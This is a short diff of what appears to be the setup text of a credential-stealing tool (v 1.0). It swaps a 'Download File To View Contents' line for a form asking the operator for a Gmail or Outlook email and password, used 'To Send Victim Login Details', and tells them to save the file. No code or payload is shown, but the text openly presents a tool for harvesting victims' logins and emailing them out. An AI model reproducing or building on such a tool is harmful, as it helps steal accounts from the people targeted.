@@ -6,4 +6,13 @@
                       
                         v 1.0
 
-Download File To View Contents
+Lets Get started...
+
+Gmail or Outlook Credentials (To Send Victim Login Details)
+
+Email: 
+Password: 
+
+Make sure to go to File at the top left and press Save.
+
+
